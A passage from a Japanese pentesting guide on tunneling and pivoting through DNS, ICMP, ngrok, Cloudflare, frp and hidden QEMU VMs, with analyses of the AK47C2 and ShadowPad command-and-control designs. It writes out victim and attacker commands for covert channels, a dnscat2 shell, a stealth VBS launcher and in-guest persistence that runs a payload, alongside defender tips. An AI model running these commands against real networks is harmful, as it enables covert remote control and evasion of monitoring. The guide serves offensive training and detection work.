前述のツール **Rpivot** は、NTLM 認証を行うプロキシ経由でリレーできます。**OpenVPN** も、auth ファイルと NTLMv2 メソッドを設定すれば、そのプロキシ経由でルーティングできます。これはプロキシ認証のバイパスではなく、プロキシの通過です。<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLMプロキシに対して認証を行い、ローカルリスナーを公開し、ローカルトンネルポートを宛先サービスにマッピングできます。クライアントはそのローカルポートを利用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート443を転送します。

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

これで、たとえば被害者側の **SSH** サービスがポート443で待ち受けるように設定すれば、攻撃者側のポート2222経由で接続できます。<sup>[[29]](#references)</sup>\
また、攻撃者側がポート2222で待ち受ける間、localhost:443に接続する **meterpreter** を使うこともできます。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）は、Microsoftの.NET製リバースプロキシツールキットです。こちらから入手できます：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

IodineはDNSクエリを介してIPv4トンネルを作成し、TUNインターフェースを使用します。文書化されているセットアップでは、両端でこれらのインターフェースを作成するために必要な権限が求められます。<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transportは直接TCP接続よりオーバーヘッドが大きく、通常は低速です。このトンネルを通して圧縮されたSSH接続を作成するには、次のようにします:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**.**

Dnscat2はDNS経由で暗号化されたcommand-and-controlチャネルを確立します。以下のserverおよびclientコマンドは、公式ドキュメントに記載された使用方法に従っています。<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell で**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) を使うと、PowerShell で dnscat2 クライアントを実行できます。README には、以下に示す `Start-Dnscat2` のパラメーターが記載されています。<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscatを使ったポートフォワーディング**

dnscat2の対話型`listen`コマンドは、ローカルのリスナーをリモートホストとポートに割り当てます。<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains DNS の変更

Proxychains-ng は動的リンクされた TCP 接続をフックしますが、UDP や ICMP は転送できません。DNS プロキシは設定可能なため、固定のパブリック resolver を前提にせず、インストール済みの `proxychains.conf` と resolver helper を確認してください。従来の `proxyresolv` スクリプトでは、resolver を選択するために `PROXY_DNS_SERVER` を指定できます。内部名が必要な場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Go のトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### カスタム DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、企業ネットワークでブロックされることがまれな2つのプロトコル、送信 **DNS** と **通常の HTTP POST** のみを悪用する **デュアルチャネル C2（「AK47C2」）** を作成しました。<sup>[[2]](#references)</sup>

1. **DNS モード (AK47DNS)**
   • ランダムな5文字の SessionID（例: `H4T14`）を生成します。  
   • *task requests* には `1`、*results* には `2` を先頭に付け、異なるフィールド（flags、SessionID、computer name）を連結します。  
   • 各フィールドを ASCII key `VHBD@H` で **XOR 暗号化**し、hex-encode してドットでつなぎ、最後に攻撃者が制御するドメインを付けます:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • リクエストでは、**TXT**（およびフォールバックとして **MG**）レコードに `DnsQuery()` を使用します。  
   • 応答が 0xFF バイトを超えると、バックドアはデータを 63 バイト単位に**分割**し、次のマーカーを挿入します。
     `s<SessionID>t<TOTAL>p<POS>` これにより、C2 server はデータを並べ替えられます。

2. **HTTP mode (AK47HTTP)**
   • JSON envelope を構築します。
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • blob 全体を XOR-`VHBD@H` → hex に変換し、`Content-Type: text/plain` ヘッダーを付けた **`POST /`** の本文として送信します。
   • 応答も同じエンコードに従い、`cmd` フィールドは `cmd.exe /c <command> 2>&1` として実行されます。

Blue Team メモ
• 最初のラベルが長い hexadecimal で、常に珍しいドメインで終わる不審な **TXT queries** を探します。
• 一定の XOR key の後に ASCII-hex が続くパターンは、YARA で簡単に検出できます: `6?56484244?484`（`VHBD@H` の hex 表現）。
• HTTP では、本文が純粋な hex で、バイト数が 2 の倍数である `text/plain` の POST を検知します。

{{#note}}
このチャネルは各サブドメインラベルを DNS の 63 オクテット制限内に保ちますが、プロトコルに準拠しているだけではステルス性は確保できません。珍しいドメイン、長い hexadecimal ラベル、クエリ量は依然として検知シグナルです。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN デバイスと ICMP echo requests を使用する IPv4-over-ICMP tunnel について説明しています。このセットアップには、インターフェースを作成できる十分な権限が必要です。<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng は TCP 接続を ICMP 経由で転送します。以下の `-p`、`-l`、`-r`、`-R` オプションは、それぞれ proxy、local listener、宛先ホスト、宛先ポートに使用します。<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) は、安全なトンネルを介してローカルネットワーク上のサービスをオンラインで公開するためのエージェントです。CLI のドキュメントには HTTP、TCP、ファイル URL のエンドポイントが記載されており、表示されるエンドポイントのホスト名は、エンドポイントやアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 基本的な使い方

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証や TLS のオプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCP トンネリング

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTPでファイルを公開する

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTPリクエストのスニッフィング

_XSS、SSRF、SSTIなどに有用_\
スタンドアロンエージェントは、デフォルトで `http://127.0.0.1:4040` にHTTP検査インターフェースを公開します。このインターフェースはHTTPトラフィック用です。<sup>[[40]](#references)</sup>

#### 内部HTTPサービスのトンネリング

`--host-header=rewrite` オプションは、上流のHTTP `Host` ヘッダーを書き換えて、ローカルサービスに一致させます。<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml のシンプルな設定例

これは ngrok Agent Config v2 を使用します。名前付きトンネルでは `proto` と `addr` を使い、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3つのトンネルを開きます。

- TCP が2つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP が1つ

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels は、Microsoft のリレーインフラストラクチャを介して、ローカルの TCP ベースのサービスを公開できます。ホスト側の CLI がアウトバウンドトンネルを作成し、`devtunnel connect` によってクライアント側にホストされたポートが再現されます。アクセス制御を意図的に緩和しない限り、トンネルにはデフォルトで認証が必要です。<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

これは、新しい受信リスナーを境界に開くことなく、`*.devtunnels.ms` 経由で RDP を公開できます。また、`rdp2tcp` などの RDP 仮想チャネルトンネルと組み合わせれば、RDP セッションを任意の TCP トラフィック向けの第2段階のピボットとして利用できます。<sup>[[58]](#references)</sup>

ハンティングでは、Dev Tunnels CLI の実行を `*.devtunnels.ms` への DNS/TLS トラフィックや、予期しない RDP 仮想チャネルイベントと関連付けてください。Microsoft が所有するリレーを使用しているからといって、認証済みトンネルが無害とは限りません。<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` コネクターは送信接続を確立します。公開されたアプリケーションでは HTTP、HTTPS、TCP、SSH、RDP をルーティングできますが、クイックトンネルは HTTP 開発用です。<sup>[[43]](#references)[[45]](#references)</sup>

### クイックトンネルのワンライナー

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 の origin（legacy mode）

legacy の `--socks5` フラグは、ローカルの origin が SOCKS5 を使用することを `cloudflared` に伝えます。ローカルの SOCKS5 listener を作成するものではありません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 の origin 処理を設定します。<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNSを使用した永続的なトンネル

ローカルで管理するトンネル設定では、以下に示すように小文字の`tunnel`、`credentials-file`、`url`キーを使用します。<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

コネクタを起動します:

```bash
cloudflared tunnel run mytunnel
```

コネクタはアウトバウンド接続を確立し、デフォルトではQUICをネゴシエートし、失敗した場合はHTTP/2にフォールバックします。すべてのデプロイでTCP/443が使われるとは限りません。デプロイに必要な権限のみを付与して実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP**をサポートするGo製のreverse proxyです。XTCPはP2P hole punchingを使用し、成功するかどうかはNATに依存します。**v0.53.0**以降は**SSH Tunnel Gateway**として動作できるため、ターゲットホストは`frpc`バイナリなしで標準のOpenSSHクライアントを使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 従来型 reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 新しい SSH ゲートウェイを使う（frpc バイナリなし）

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

上記のコマンドは、`frps`をゲートウェイとして、標準のOpenSSHクライアントを使い、被害者のポート**8080**を**attacker_ip:9000**として公開します。<sup>[[50]](#references)</sup>

## STUN-assisted UDP back-connects

UDPソケットから送信したSTUN Bindingリクエストにより、そのソケットのサーバーリフレクティブIPアドレスとポートを特定できます。また、定期的に通信することでNATバインディングを維持できます。ただし、公開STUNサーバーは任意の制御パケットを中継するものではありません。<sup>[[60]](#references)</sup> 分析されたback-connectの設計では、短い制御データグラムに同じUDPソケットを使い、トリガーの受信後、*別のアウトバウンドTCP接続*を使ってコマンドを取得し、実行していました。<sup>[[59]](#references)</sup>

コントローラーからのUDPパケットを受信するには、設計上、コントローラーとマッピングを共有し、NATのフィルタリングポリシーを満たす必要があります。アドレス依存またはポート依存のフィルタリングでは、STUNサーバーからの応答は許可されても、別のエンドポイントからのパケットは破棄される場合があります。<sup>[[60]](#references)[[61]](#references)</sup> 分析されたバックドアのランデブー経路は検証されていないため、STUN応答が成功しただけでは、制御チャネルに到達できるとは証明できません。<sup>[[59]](#references)</sup> ランデブーとリレーへのフォールバックを明示的に備えた別のプロトコルについては、[PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport)を参照してください。

## QEMUを使った隠蔽VMベースのトンネル

QEMUのユーザーモードネットワークでは、仮想ネットワークにrootまたは管理者権限は必要ありません。また、`-netdev user,hostfwd=...`を使うと、ホストからゲストへTCP、UDP、またはUNIX接続を転送できます。<sup>[[51]](#references)</sup> TrustedSecは、ホストを対象とするEDRがゲスト内の活動を見逃す可能性があったインシデントで、Tiny Core QEMU VMと、試みられたリバースSSHトンネルについて記録しています。<sup>[[1]](#references)</sup>

### 手早く実行できるワンライナー

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 上記のコマンドは、ゲストメモリ256 MiB、qcow2ディスクイメージを使用する**Tiny Core Linux**ゲストを起動します。ディスクイメージはRAMディスクではありません。
• Windowsホストのポート**2222/tcp**は、ゲスト内の**22/tcp**に透過的に転送されます。
• 攻撃者から見ると、ターゲットはポート2222を公開しているだけです。そこに到達したパケットは、VM内で動作するSSHサーバーによって処理されます。

### VBScriptによるステルス起動

TrustedSecは、上記のインシデントで引用された事例において、VBSを使ったQEMUの起動とTiny Coreイメージを確認しました。<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されたインシデントでは、ステートレスな Tiny Core ゲストで `/opt/bootlocal.sh` と `/opt/filetool.lst` を使った永続化が説明されています。<sup>[[1]](#references)</sup>

1. ペイロードを `/opt/123.out` に配置する  
2. `/opt/bootlocal.sh` に追記する:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. シャットダウン時に payload が `mydata.tgz` にパックされるよう、`home/tc` と `opt` を `/opt/filetool.lst` に追加します。

### テレメトリに関する考慮事項

• ホストには引き続き、QEMU プロセス、qcow2 イメージ、ホスト側で転送されたリスナーが露出します。  
• ホストのみを対象とするプロセススキャンではゲストのプロセスを検査しない場合がありますが、仮想化による回避が保証されるわけではありません。ネットワーク、QEMU、イメージのテレメトリから検出される可能性があります。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある**想定外の QEMU/VirtualBox/KVM バイナリ**を検知する。  
• `qemu-system*.exe` から発信される外向きの接続をブロックする。  
• QEMU の起動直後にバインドする、頻度の低い待ち受けポート（2222、10022、…）を調査する。

## `HttpAddUrl` 経由の IIS/HTTP.sys リレーノード（ShadowPad）

Check Point は、ShadowPad の IIS モジュールが `HttpAddUrl` を介して URL プレフィックスをバインドし、侵害された境界 Web サーバーをバックドア兼リレーノードに変える仕組みを説明しています。<sup>[[3]](#references)</sup>

同レポートでは、以下にまとめたデフォルト設定、ワイルドカードリスナー、パケットの復号、リレーキュー、デバッグテレメトリについても詳しく説明されています。<sup>[[3]](#references)</sup>

* **デフォルト設定** – モジュールの JSON 設定で値が省略されている場合、もっともらしい IIS のデフォルト値（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）が使用されます。これにより、通常のトラフィックには IIS が適切なブランド情報を付けて応答します。
* **ワイルドカードによる傍受** – オペレーターは、セミコロンで区切った URL プレフィックスのリスト（ホストとパスにワイルドカードを指定）を設定します。モジュールは各エントリに対して `HttpAddUrl` を呼び出すため、HTTP.sys は一致するリクエストを悪意のあるハンドラーにルーティングし、一致しないリクエストは通常の IIS の動作にフォールバックします。
* **暗号化された最初のパケット** – リクエスト本文の最初の 2 バイトが、カスタムの 32 ビット PRNG のシードになります。プロトコルを解析する前に、それ以降の各バイトが生成されたキーストリームと XOR されます。

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – このモジュールは「servers」（上流ノード）と「clients」（下流インプラント）の2つのリストを管理します。約30秒以内にheartbeatが届かなかったエントリは削除されます。両方のリストが空でない場合、最初に見つかった正常なserverとclientをペアにし、どちらか一方が接続を閉じるまで、両者のソケット間でバイト列をそのまま転送します。
* **Debug telemetry** – オプションのログには、各ペアリングの送信元IP、宛先IP、転送された総バイト数が記録されます。調査担当者はこれらの痕跡を使い、複数の被害者にまたがるShadowPadのmeshを再構築しました。

---

## その他のツール

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [影に潜む：QEMU仮想化を介した covert tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell以前：Storm-2603の過去のランサムウェア活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragonの内部：ステルス性の高い攻撃作戦のrelay networkと内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmapリファレンスガイド：Firewall/IDSの制限を回避する](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD sshマニュアル](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_configマニュアル](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6リリースノート](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：MetasploitでのPivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxyモジュールのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autorouteモジュールのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ngクイックスタート](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socatマニュアル](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plinkマニュアル](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTYコマンドラインオプション](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxyコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifierドキュメント](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7マニュアル](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：ドメイン名 - 実装と仕様](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnelの概要](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnelのoriginパラメーター](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnelのセットアップ](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel設定ファイル](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnelの実行パラメーター](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frpの概念](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMUネットワークドキュメント](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScaleソースリポジトリ](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：BOF-PEから構築するCDN経由のTailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLIコマンド](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT：GhostContainerとトンネリング](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoorが公開STUNインフラを悪用](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT越えセッションユーティリティ（STUN）](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Unicast UDPのNAT動作要件](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malwareがTailscaleのtailcatを使ってネットワーク検知を回避](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
